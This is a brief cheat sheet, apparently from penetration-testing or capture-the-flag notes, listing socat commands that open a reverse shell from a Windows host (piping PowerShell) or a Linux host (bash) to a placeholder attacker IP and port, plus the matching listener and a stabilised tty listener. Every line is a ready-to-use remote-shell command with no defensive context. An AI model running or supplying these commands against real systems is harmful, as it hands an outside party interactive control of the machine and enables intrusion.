### windows
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

### linux
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`

### listener
`socat TCP-L:<port> -`

more stable shell for linux only
``socat TCP-L:<port> FILE:`tty`,raw,echo=0``
